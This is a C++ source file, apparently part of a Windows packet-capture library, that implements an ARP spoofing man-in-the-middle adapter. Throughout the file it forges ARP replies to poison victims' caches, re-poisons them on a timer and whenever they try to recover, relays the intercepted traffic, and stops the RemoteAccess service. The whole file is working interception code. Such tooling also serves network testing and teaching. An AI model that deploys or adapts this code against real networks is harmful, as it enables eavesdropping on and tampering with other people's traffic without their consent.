#include <SnoopArpSpoof>
#include <SnoopTcp> // for SnoopTcp::checksum
#include <VDebugNew>

REGISTER_METACLASS(SnoopArpSpoof, SnoopCapture)

// ----------------------------------------------------------------------------
// SnoopArpSpoofSession
// ----------------------------------------------------------------------------
SnoopArpSpoofSession::SnoopArpSpoofSession()
{
  clear();
}

SnoopArpSpoofSession::~SnoopArpSpoofSession()
{
  clear();

}
void SnoopArpSpoofSession::clear()
{
  senderIp  = 0;
  senderMac = Mac::cleanMac();
  targetIp  = 0;
  targetMac = Mac::cleanMac();
}

bool SnoopArpSpoofSession::operator ==(const SnoopArpSpoofSession& r)
{
  if (this->senderIp  != r.senderIp)  return false;
  if (this->senderMac != r.senderMac) return false;
  if (this->targetIp  != r.targetIp)  return false;
  if (this->targetMac != r.targetMac) return false;
  return true;
}

void SnoopArpSpoofSession::load(VXml xml)
{
  senderIp  = xml.getStr("senderIp",  senderIp.str());
  senderMac = xml.getStr("senderMac", senderMac.str());
  targetIp  = xml.getStr("targetIp",  targetIp.str());
  targetMac = xml.getStr("targetMac", targetMac.str());
}

void SnoopArpSpoofSession::save(VXml xml)
{
  xml.setStr("senderIp",  senderIp.str());
  xml.setStr("senderMac", senderMac.str());
  xml.setStr("targetIp",  targetIp.str());
  xml.setStr("targetMac", targetMac.str());
}

#ifdef QT_GUI_LIB
void SnoopArpSpoofSession::initialize(QTreeWidget* treeWidget)
{
  treeWidget->setMinimumWidth(400);

  QStringList headerLables;
  headerLables << "Sender IP" << "Sender Mac" << "Target IP" << "Target Mac";
  treeWidget->setHeaderLabels(headerLables);

  treeWidget->setColumnWidth(SnoopArpSpoofSession::SENDER_IP_IDX,  100);
  treeWidget->setColumnWidth(SnoopArpSpoofSession::SENDER_MAC_IDX, 100);
  treeWidget->setColumnWidth(SnoopArpSpoofSession::TARGET_IP_IDX,  100);
  treeWidget->setColumnWidth(SnoopArpSpoofSession::TARGET_MAC_IDX, 100);
}

void operator << (QTreeWidgetItem& treeWidgetItem, SnoopArpSpoofSession& session)
{
  treeWidgetItem.setText(SnoopArpSpoofSession::SENDER_IP_IDX,  session.senderIp.str());
  treeWidgetItem.setText(SnoopArpSpoofSession::SENDER_MAC_IDX, session.senderMac.str());
  treeWidgetItem.setText(SnoopArpSpoofSession::TARGET_IP_IDX,  session.targetIp.str());
  treeWidgetItem.setText(SnoopArpSpoofSession::TARGET_MAC_IDX, session.targetMac.str());

  treeWidgetItem.setFlags(treeWidgetItem.flags() | Qt::ItemIsEditable);
}

void operator << (SnoopArpSpoofSession& session, QTreeWidgetItem& treeWidgetItem)
{
  session.senderIp  = treeWidgetItem.text(SnoopArpSpoofSession::SENDER_IP_IDX);
  session.senderMac = treeWidgetItem.text(SnoopArpSpoofSession::SENDER_MAC_IDX);
  session.targetIp  = treeWidgetItem.text(SnoopArpSpoofSession::TARGET_IP_IDX);
  session.targetMac = treeWidgetItem.text(SnoopArpSpoofSession::TARGET_MAC_IDX);
}
#endif // QT_GUI_LIB

// ----------------------------------------------------------------------------
// SnoopArpSpoofSessionList
// ----------------------------------------------------------------------------
SnoopArpSpoofSessionList::SnoopArpSpoofSessionList(SnoopArpSpoof* arpSpoof)
{
  this->arpSpoof = arpSpoof;
}

SnoopArpSpoofSessionList::~SnoopArpSpoofSessionList()
{
  clear();
}

void SnoopArpSpoofSessionList::add(SnoopArpSpoofSession& session)
{
  VLock lock(*this);
  this->push_back(session); // gilgil temp 2014.03.27
  if (arpSpoof->active())
  {
    // ----- gilgil temp 2014.03.27 -----
    LOG_DEBUG("***************************");
    LOG_DEBUG("session(%s %s) is addded!!!");
    LOG_DEBUG("***************************");
    // ----------------------------------
  }
}

void SnoopArpSpoofSessionList::del(SnoopArpSpoofSession& session)
{
  VLock lock(*this);
  int index = this->indexOf(session);
  this->removeAt(index);
  if (arpSpoof->active())
  {
    // ----- gilgil temp 2014.03.27 -----
    LOG_DEBUG("****************************");
    LOG_DEBUG("session(%s %s) is deleted!!!");
    LOG_DEBUG("****************************");
    // ----------------------------------
  }
}

void SnoopArpSpoofSessionList::load(VXml xml)
{
  clear();
  {
    xml_foreach (childXml, xml.childs())
    {
      SnoopArpSpoofSession session;
      session.load(childXml);
      push_back(session);
    }
  }
}

void SnoopArpSpoofSessionList::save(VXml xml)
{
  xml.clearChild();
  for (SnoopArpSpoofSessionList::iterator it = begin(); it != end(); it++)
  {
    SnoopArpSpoofSession& session = *it;
    VXml childXml = xml.addChild("session");
    session.save(childXml);
  }
}

#ifdef QT_GUI_LIB
#include "ui_vlistwidget.h"
void SnoopArpSpoofSessionList::optionAddWidget(QLayout* layout)
{
  VListWidget* widget = new VListWidget(layout->parentWidget(), this);
  SnoopArpSpoofSession::initialize(widget->ui->treeWidget);
  widget->setObjectName("snoopArpSpoofWidget");
  widget->itemsIntoTreeWidget();
  layout->addWidget(widget);
}

void SnoopArpSpoofSessionList::optionSaveDlg(QDialog* dialog)
{
  VListWidget* widget = dialog->findChild<VListWidget*>("snoopArpSpoofWidget");
  LOG_ASSERT(widget != NULL);
  widget->treeWidgetIntoItems();
}
#endif // QT_GUI_LIB

// ----------------------------------------------------------------------------
// SnoopArpSpoofInfectThread
// ----------------------------------------------------------------------------
SnoopArpSpoofInfectThread::SnoopArpSpoofInfectThread(SnoopArpSpoof* arpSpoof)
{
  this->arpSpoof = arpSpoof;
}

SnoopArpSpoofInfectThread::~SnoopArpSpoofInfectThread()
{
  close();
}

bool SnoopArpSpoofInfectThread::open()
{
  return VThread::open();
}

bool SnoopArpSpoofInfectThread::close()
{
  event.setEvent();
  return VThread::close();
}

void SnoopArpSpoofInfectThread::run()
{
  VTimeout interval = (VDuration)arpSpoof->infectInterval;

  while (active())
  {
    bool res = event.wait(interval);
    if (res) break;
    {
      arpSpoof->sendArpInfectAll();
    }
  }
}

// ----------------------------------------------------------------------------
// SnoopArpSpoof
// ----------------------------------------------------------------------------
SnoopArpSpoof::SnoopArpSpoof(void* owner) : SnoopAdapter(owner), sessionList(this)
{
  virtualMac            = Mac::cleanMac();
  selfRelay             = true;
  disableAutoRouting    = true;
  infectInterval        = 1000; // 1 sec
  sessionList.clear();

  realVirtualMac        = Mac::cleanMac();
  netInfo.clear();
  findHost.scanInterval = 1000;
  findHost.sendInterval = 0;
  infectThread          = NULL;
}

SnoopArpSpoof::~SnoopArpSpoof()
{
  close();
}

bool SnoopArpSpoof::doOpen()
{
  if (!enabled)
  {
    LOG_DEBUG("enabled is false");
    return true;
  }
  
  //
  // Inherited open
  //
  QString tempFilter = filter;
  filter = "ip or arp";
  bool res = SnoopAdapter::doOpen();
  filter = tempFilter;
  if (!res) return false;

  netInfo.adapterIndex = this->adapterIndex;
  findHost.adapterIndex = this->adapterIndex;
  //
  // Set realVirtualMac using virtualMac
  //
  if (virtualMac.isClean())
  {
    realVirtualMac = netInfo.mac;
  }
  else
  {
    realVirtualMac = virtualMac;
  }
  LOG_DEBUG("realVirtualMac=%s", qPrintable(realVirtualMac.str()));

  //
  // Retrieve unknown mac host list
  //
  if (!retrieveUnknownMacHostList()) return false;

  //
  // Open bpFilter
  //
  bpFilter.filter = this->filter;
  if (!bpFilter.open())
  {
    error = bpFilter.error;
    return false;
  }

  //
  // Disable Auto Routing
  //
  if (disableAutoRouting)
  {
    static bool done = false;
    if (!done)
    {
      QProcess process;

      process.start("sc start RemoteAccess");
      if (!process.waitForFinished())
      {
        SET_ERROR(VError, "process.waitForStarted(sc start RemoteAccess) return false", VERR_RUN_PROCESS);
        return false;
      }

      process.start("sc stop RemoteAccess");
      if (!process.waitForFinished())
      {
        SET_ERROR(VError, "process.waitForStarted(sc stop RemoteAccess) return false", VERR_RUN_PROCESS);
        return false;
      }
      done = true;
    }
  }

  //
  // Open infectThread
  //
  if (infectInterval != 0)
  {
    infectThread = new SnoopArpSpoofInfectThread(this);
    if (!infectThread->open())
    {
      SET_ERROR(SnoopError, "can not open infect thread", VERR_CAN_NOT_OPEN_THREAD);
      return false;
    }
  }

  //
  // Send ARP infect packet
  //
  sendArpInfectAll();

  return true;
}

bool SnoopArpSpoof::doClose()
{
  if (!enabled)
  {
    LOG_DEBUG("enabled is false");
    return true;
  }
  
  bpFilter.close();
  SAFE_DELETE(infectThread);
  for (int i = 0; i < 3; i++)
  {
    sendArpRecoverAll();
    msleep(100); // gilgil temp 2014.03.29
  }
  return SnoopAdapter::doClose();
}

int SnoopArpSpoof::read(SnoopPacket* packet)
{
  int res = SnoopAdapter::read(packet);
  if (res <= 0) return res;

  //
  // If ARP packet?
  //
  if (packet->arpHdr != NULL)
  {
    preventArpRecover(packet->ethHdr, packet->arpHdr);
    return 0;
  }

  //
  // If IP packet?
  //
  if (packet->ipHdr == NULL)
  {
    return 0;
  }

  SnoopArpSpoofSession* session;
  IpPacketType packetType = findSessionByIpPacket(packet, &session);

  switch (packetType)
  {
    case ipNone:
      LOG_FATAL("findSessionByIpPacket return ipNone");
      res = -1;
      break;

    case ipSender:
      packet->ethHdr->ether_dhost = session->targetMac;
      if (!bpFilter._check(packet->pktData, (UINT)packet->pktHdr->caplen))
      {
        emit capturedOther(packet);
        relay(packet);
        res = 0;
      }
      break;

    case ipRelay:
      emit capturedSpoof(packet);
      res = 0;
      break;

    case ipSelfSpoofed:
    case ipOther:
      capturedOther(packet);
      res = 0;
      break;
  }

  return res;
}

int SnoopArpSpoof::write(SnoopPacket* packet)
{
  return SnoopAdapter::write(packet);
}

int SnoopArpSpoof::write(u_char* buf, int size, WINDIVERT_ADDRESS* divertAddr)
{
  ETH_HDR* ethHdr     = (ETH_HDR*)buf;
  ethHdr->ether_shost = realVirtualMac;
  return SnoopAdapter::write(buf, size, divertAddr);
}

bool SnoopArpSpoof::relay(SnoopPacket* packet)
{
  // ----- by gilgil 2007.06.12 -----
  // Strange to say, TCP checksum can not be correct(Self Spoofing Windows XP).
  // if (SnoopIP::isTCP(ipHdr, &tcpHdr) && ((tcpHdr->rsvd_flags & TCP_FLAG_SYN) != 0)) // gilgil temp 2009.09.01
  if (packet->tcpHdr != NULL && ((packet->tcpHdr->th_flags & TH_SYN) != 0))
  {
    UINT16 newChecksum = SnoopTcp::checksum(packet->ipHdr, packet->tcpHdr); // gilgil temp 2008.10.20
    packet->tcpHdr->th_sum = htons(newChecksum);
  }
  // --------------------------------
  return write(packet);
}

bool SnoopArpSpoof::retrieveUnknownMacHostList()
{
  // ----- gilgil temp 2014.03.28 -----
  /*
  //
  // Check if sessionCount is zero.
  //
  if (sessionList.size() == 0)
  {
    SET_ERROR(SnoopError, "session count is zero", VERR_SESSION_COUNT_IS_ZERO);
    return false;
  }
  */
  // ----------------------------------

  //
  // Check if source ip is same with target ip
  //
  for (SnoopArpSpoofSessionList::iterator it = sessionList.begin(); it != sessionList.end(); it++)
  {
    SnoopArpSpoofSession& session = *it;
    if ((session.senderIp == session.targetIp))
    {
      SET_ERROR(SnoopError, qformat("source ip is same as target ip(%s)", qPrintable(session.senderIp.str())), VERR_THE_SAME_SOURCE_AND_TARGET_IP);
      return false;
    }

    if (session.senderIp == netInfo.ip)
    {
      SET_ERROR(SnoopError, qformat("can not spoof myself(%s)", qPrintable(session.senderIp.str())), VERR_CAN_NOT_SPOOF_MYSELF);
      return false;
    }
  }

  //
  // Find all ip and mac
  //
  findHost.autoRead = false;
  if (!findHost.open())
  {
    error = findHost.error;
    return false;
  }
  findHost.hostList.clear();
  findHost.hostList.push_back(SnoopHost(netInfo.ip, netInfo.mac)); // my netinfo
  for (SnoopArpSpoofSessionList::iterator it = sessionList.begin(); it != sessionList.end(); it++)
  {
    SnoopArpSpoofSession& session = *it;
    findHost.hostList.push_back(SnoopHost(session.senderIp));
    findHost.hostList.push_back(SnoopHost(session.targetIp));
  }
  bool res = findHost.findAll();
  VError findHostError = findHost.error;
  findHost.close();
  if (!res)
  {
    error = findHostError;
    return false;
  }

  //
  // Set mac of sessionList from findHost.
  //
  for (SnoopArpSpoofSessionList::iterator it = sessionList.begin(); it != sessionList.end(); it++)
  {
    SnoopArpSpoofSession& session = *it;

    // Set senderMac according to senderIp
    if (session.senderMac == Mac::cleanMac())
    {
      SnoopHost* host = findHost.hostList.findByIp(session.senderIp);
      if (host == NULL)
      {
        SET_ERROR(SnoopError, qformat("can not find host(%s)", qPrintable(session.senderIp.str())), VERR_CAN_NOT_FIND_HOST);
        return false;
      }
      session.senderMac = host->mac;
    }

    // Set targetMac according to targetIp
    if (session.targetMac == Mac::cleanMac())
    {
      SnoopHost* host = findHost.hostList.findByIp(session.targetIp);
      if (host == NULL)
      {
        SET_ERROR(SnoopError, qformat("can not find host(%s)", qPrintable(session.targetIp.str())), VERR_CAN_NOT_FIND_HOST);
        return false;
      }
      session.targetMac = host->mac;
    }

    // Check if targetMac is same as realVirtualMac
    if (realVirtualMac == session.targetMac)
    {
      SET_ERROR(SnoopError,
        qformat("real virtual mac(%s) is same as target mac(IP=%s)",
          qPrintable(realVirtualMac.str()),
          qPrintable(session.targetIp.str())),
        VERR_THE_SAME_REAL_AND_TARGET_MAC);
      return false;
    }
  }

  return true;
}

bool SnoopArpSpoof::sendArpInfect(SnoopArpSpoofSession& session)
{
  static const int BUF_SIZE = sizeof(ETH_HDR) + sizeof(ARP_HDR);
  BYTE buf[BUF_SIZE];
  ETH_HDR* ethHdr = (ETH_HDR*)buf;
  ARP_HDR* arpHdr = (ARP_HDR*)(buf + sizeof(ETH_HDR));

  //
  // Set ethHdr
  //
  ethHdr->ether_dhost = session.senderMac;
  ethHdr->ether_shost = this->realVirtualMac;
  ethHdr->ether_type  = htons(ETHERTYPE_ARP);

  //
  // Set arpHdr
  //
  arpHdr->ar_hrd = htons(ARPHRD_ETHER);
  arpHdr->ar_pro = htons(ETHERTYPE_IP);
  arpHdr->ar_hln = sizeof(Mac);
  arpHdr->ar_pln = sizeof(Ip);
  arpHdr->ar_op  = htons(ARPOP_REPLY);
  arpHdr->ar_sa  = this->realVirtualMac;
  arpHdr->ar_si  = htonl(session.targetIp);
  arpHdr->ar_ta  = session.senderMac;
  arpHdr->ar_ti  = htonl(session.senderIp);

  // send ARP packet
  int res = write(buf, BUF_SIZE);
  if (res < 0)
  {
    LOG_ERROR("********************");
    LOG_ERROR("write return %d", res);
    LOG_ERROR("********************");
    return false;
  }
  return true;
}

bool SnoopArpSpoof::sendArpInfectAll()
{
  VLock lock(sessionList);
  for (SnoopArpSpoofSessionList::iterator it = sessionList.begin(); it != sessionList.end(); it++)
  {
    SnoopArpSpoofSession& session = *it;
    if (!sendArpInfect(session))
    {
      return false;
    }
    msleep(50); // gilgil temp 2014.07.31
  }
  return true;
}

bool SnoopArpSpoof::sendArpRecover(SnoopArpSpoofSession& session)
{
  static const int BUF_SIZE = sizeof(ETH_HDR) + sizeof(ARP_HDR);
  BYTE buf[BUF_SIZE];
  ETH_HDR* ethHdr = (ETH_HDR*)buf;
  ARP_HDR* arpHdr = (ARP_HDR*)(buf + sizeof(ETH_HDR));

  //
  // Set ethHdr
  //
  ethHdr->ether_dhost = session.senderMac;
  ethHdr->ether_shost = this->realVirtualMac;
  ethHdr->ether_type  = htons(ETHERTYPE_ARP);

  //
  // Set arpHdr
  //
  arpHdr->ar_hrd = htons(ARPHRD_ETHER);
  arpHdr->ar_pro = htons(ETHERTYPE_IP);
  arpHdr->ar_hln = sizeof(Mac);
  arpHdr->ar_pln = sizeof(Ip);
  arpHdr->ar_op  = htons(ARPOP_REPLY);
  arpHdr->ar_sa  = session.targetMac;
  arpHdr->ar_si  = htonl(session.targetIp);
  arpHdr->ar_ta  = session.senderMac;
  arpHdr->ar_ti  = htonl(session.senderIp);

  // send ARP packet
  int res = write(buf, BUF_SIZE);
  if (res < 0)
  {
    LOG_ERROR("********************");
    LOG_ERROR("write return %d", res);
    LOG_ERROR("********************");
    return false;
  }
  return true;
}

bool SnoopArpSpoof::sendArpRecoverAll()
{
  VLock lock(sessionList);
  for (SnoopArpSpoofSessionList::iterator it = sessionList.begin(); it != sessionList.end(); it++)
  {
    SnoopArpSpoofSession& session = *it;
    if (!sendArpRecover(session))
    {
      return false;
    }
    msleep(50); // gilgil temp 2014.07.31
  }
  return true;
}

void SnoopArpSpoof::preventArpRecover(ETH_HDR* ethHdr, ARP_HDR* arpHdr)
{
  Mac    srcMac    = ethHdr->ether_shost;
  Mac    dstMac    = ethHdr->ether_dhost;

  UINT16 operation = ntohs(arpHdr->ar_op);
  Mac    senderHa  = arpHdr->ar_sa;
  Ip     senderIp  = ntohl(arpHdr->ar_si);
  Mac    targetHa  = arpHdr->ar_ta;
  Ip     targetIp  = htonl(arpHdr->ar_ti);

  for (SnoopArpSpoofSessionList::iterator it = sessionList.begin(); it != sessionList.end(); it++)
  {
    SnoopArpSpoofSession& session = *it;

    //
    // If my own ARP infection packet, do not anything
    //
    if (
      srcMac == realVirtualMac &&
      dstMac == session.senderMac &&

      operation == ARPOP_REPLY &&
      senderHa  == realVirtualMac &&
      senderIp  == session.targetIp &&
      targetHa  == session.senderMac &&
      targetIp  == session.senderIp)
    {
      continue;
    }

    //
    // If Target sending ARP packet?
    //
    if (srcMac == session.targetMac)
    {
      //
      //  If it recovers Sender?
      //
      if (dstMac == session.senderMac)
      {
        sendArpInfect(session);
        continue;
      }
      if (dstMac == Mac::broadcastMac())
      {
        for (SnoopArpSpoofSessionList::iterator it2 = sessionList.begin(); it2 != sessionList.end(); it2++)
        {
          SnoopArpSpoofSession& session2 = *it2;

          if (session2.targetMac == srcMac)
          {
            sendArpInfect(session2);
            LOG_DEBUG("send ARP infect(%s > %s)", qPrintable(session2.senderIp.str()), qPrintable(session2.targetIp.str()));
          }
        }
        continue;
      }
    }

    //
    // If Sender ARP packet?
    //
    if (srcMac == session.senderMac)
    {
      if (senderHa == session.senderMac && targetIp == session.targetIp)
      {
        sendArpInfect(session);
        LOG_DEBUG("send ARP infect(%s > %s)", qPrintable(session.senderIp.str()), qPrintable(session.targetIp.str()));
      }
    }
  }
}

SnoopArpSpoof::IpPacketType SnoopArpSpoof::findSessionByIpPacket(SnoopPacket* packet, SnoopArpSpoofSession** _session)
{
  LOG_ASSERT(packet->ethHdr != NULL);
  LOG_ASSERT(packet->ipHdr  != NULL);

  Mac srcMac = packet->ethHdr->ether_shost;
  Mac dstMac = packet->ethHdr->ether_dhost;

  //
  // If broadcast IP Packet?
  //
  if (dstMac.isBroadcast()) return ipOther;
  if (dstMac.isMulticast()) return ipOther;

  Ip srcIp    = ntohl(packet->ipHdr->ip_src);
  Ip dstIp    = htonl(packet->ipHdr->ip_dst);
  Ip adjSrcIp = netInfo.getAdjIp(srcIp);
  Ip adjDstIp = netInfo.getAdjIp(dstIp);

  //
  // Find session
  //
  VLock lock(sessionList);
  for (SnoopArpSpoofSessionList::iterator it = sessionList.begin(); it != sessionList.end(); it++)
  {
    SnoopArpSpoofSession& session = *it;

    //
    // ipSender?
    //
    if (
      srcMac    == session.senderMac &&
      dstMac    == realVirtualMac &&
      adjSrcIp  == session.senderIp &&
      adjDstIp  == session.targetIp)
    {
      // LOG_DEBUG("ipSender %s %s %s %s", qPrintable(srcMac.str()), qPrintable(dstMac.str()), qPrintable(srcIp.str()), qPrintable(dstIp.str())); // gilgil temp 2014.03.29
      *_session = &session;
      return ipSender;
    }

    //
    // ipRelay?
    //
    if (
      srcMac    == realVirtualMac &&
      dstMac    == session.targetMac &&
      adjSrcIp  == session.senderIp &&
      adjDstIp  == session.targetIp)
    {
      // LOG_DEBUG("ipRelay %s %s %s %s", qPrintable(srcMac.str()), qPrintable(dstMac.str()), qPrintable(srcIp.str()), qPrintable(dstIp.str())); // gilgil temp 2014.03.29
      return ipRelay;
    }
  }

  //
  // Process self relay
  //
  if (selfRelay)
  {
    if (
      srcMac                       == netInfo.mac &&
      ntohl(packet->ipHdr->ip_src) == netInfo.ip)
    {
      SnoopHost* host = this->findHost.hostList.findByIp(adjDstIp);
      if (dstMac == realVirtualMac)
      {
        LOG_ASSERT(host != NULL);
        packet->ethHdr->ether_dhost = host->mac;
        relay(packet);
        return ipSelfSpoofed;
      }
      if (host != NULL && dstMac == host->mac)
      {
        return ipRelay; // self spoofed relay packet
      }
    }
  }

  return ipOther;
}

void SnoopArpSpoof::load(VXml xml)
{
  SnoopAdapter::load(xml);

  virtualMac         = xml.getStr("virtualMac", virtualMac.str());
  selfRelay          = xml.getBool("selfRelay", selfRelay);
  disableAutoRouting = xml.getBool("disableAutoRouting", disableAutoRouting);
  infectInterval     = xml.getULong("infectInterval", infectInterval);
  sessionList.load(xml.gotoChild("sessionList"));
}

void SnoopArpSpoof::save(VXml xml)
{
  SnoopAdapter::save(xml);

  xml.setStr("virtualMac",          virtualMac.str());
  xml.setBool("selfRelay",          selfRelay);
  xml.setBool("disableAutoRouting", disableAutoRouting);
  xml.setULong("infectInterval", infectInterval);
  sessionList.save(xml.gotoChild("sessionList"));
}

#ifdef QT_GUI_LIB
void SnoopArpSpoof::optionAddWidget(QLayout* layout)
{
  SnoopAdapter::optionAddWidget(layout);

  VOptionable::addLineEdit(layout, "leVirtualMac", "Virtual Mac", virtualMac.str());
  VOptionable::addCheckBox(layout, "chkSelfRelay", "Self Relay", selfRelay);
  VOptionable::addCheckBox(layout, "chkDisableAutoRouting", "Disable Auto Routing", disableAutoRouting);
  VOptionable::addLineEdit(layout, "leInfectInterval", "Infect Interval", QString::number(infectInterval));
  sessionList.optionAddWidget(layout);
}

void SnoopArpSpoof::optionSaveDlg(QDialog* dialog)
{
  SnoopAdapter::optionSaveDlg(dialog);

  virtualMac = dialog->findChild<QLineEdit*>("leVirtualMac")->text();
  selfRelay  = dialog->findChild<QCheckBox*>("chkSelfRelay")->checkState() == Qt::Checked;
  disableAutoRouting  = dialog->findChild<QCheckBox*>("chkDisableAutoRouting")->checkState() == Qt::Checked;
  infectInterval = dialog->findChild<QLineEdit*>("leInfectInterval")->text().toULong();
  sessionList.optionSaveDlg(dialog);
}
#endif // QT_GUI_LIB
